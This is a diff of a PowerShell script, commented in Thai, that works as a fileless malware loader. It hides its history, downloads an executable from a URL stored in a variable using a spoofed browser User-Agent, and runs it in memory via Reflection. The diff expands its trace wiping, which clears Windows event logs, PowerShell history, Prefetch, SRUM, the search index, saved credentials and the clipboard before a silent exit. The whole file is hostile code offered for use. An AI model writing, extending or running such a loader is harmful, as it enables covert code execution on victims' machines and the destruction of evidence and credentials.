@@ -1,9 +1,13 @@
 # ============================================
-# 1. ปิดการบันทึกประวัติ
+# 1. ปิดการบันทึกประวัติ (เพิ่มเติม)
 # ============================================
 Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
+
+# ปิด Transcript logging ถ้ามี
+$PSDefaultParameterValues['*:Verbose'] = $false
+$PSDefaultParameterValues['*:Debug'] = $false
 
 # ============================================
 # 2. ฟังก์ชันดาวน์โหลด EXE (ไม่เขียนไฟล์)
@@ -12,11 +16,11 @@ function Download-EXE {
     param([string]$Url)
     try {
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $wc.Proxy = $null
         return $wc.DownloadData($Url)
     } catch {
-        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing
+        $response = Invoke-WebRequest -Uri $Url -UseBasicParsing -UserAgent "Mozilla/5.0"
         return $response.Content
     }
 }
@@ -26,7 +30,7 @@ function Download-EXE {
 # ============================================
 function Invoke-MemoryExecution {
     param([byte[]]$Bytes)
-    
+
     try {
         $assembly = [System.Reflection.Assembly]::Load($Bytes)
         $entryPoint = $assembly.EntryPoint
@@ -83,12 +87,13 @@ if ($bytes -and $bytes.Length -gt 0) {
 }
 
 # ============================================
-# 5. ล้างร่องรอยทุกอย่าง (ดีที่สุด)
+# 5. ล้างร่องรอยทุกอย่าง (เพิ่มเติม)
 # ============================================
 
-# --- ล้าง PowerShell History ---
+# --- ล้าง PowerShell History (ทุกทาง) ---
 try {
     Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:USERPROFILE\.pshistory" -Force -ErrorAction SilentlyContinue
     Clear-History
 } catch {}
 
@@ -98,6 +103,7 @@ try {
     wevtutil cl System 2>$null
     wevtutil cl Application 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+    wevtutil cl "Windows PowerShell" 2>$null
 } catch {}
 
 # --- ล้าง Prefetch ---
@@ -189,9 +195,38 @@ try {
     Remove-Item "C:\Windows\System32\sru\srudb.dat" -Force -ErrorAction SilentlyContinue
 } catch {}
 
+# --- ล้าง PowerShell Module Cache ---
+try {
+    Remove-Item "$env:USERPROFILE\AppData\Local\Microsoft\PowerShell\*" -Force -Recurse -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Windows Search Index (ถ้ามี) ---
+try {
+    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+    Remove-Item "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
+    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
+} catch {}
+
+# --- ล้าง Credential Manager (ถ้ามี) ---
+try {
+    cmdkey /delete * 2>$null
+} catch {}
+
+# --- ล้าง Clipboard History ---
+try {
+    Set-Clipboard -Value $null 2>$null
+} catch {}
+
+# --- ล้าง Console Buffer ---
+try {
+    [System.Console]::Clear() 2>$null
+} catch {}
+
 # ============================================
-# 6. ปิดตัวเองอย่างเงียบ
+# 6. ปิดตัวเองอย่างเงียบ (ไม่ทิ้งรอย)
 # ============================================
 $bytes = $null
 $exeUrl = $null
+[GC]::Collect()
+[GC]::WaitForPendingFinalizers()
 [Environment]::Exit(0)
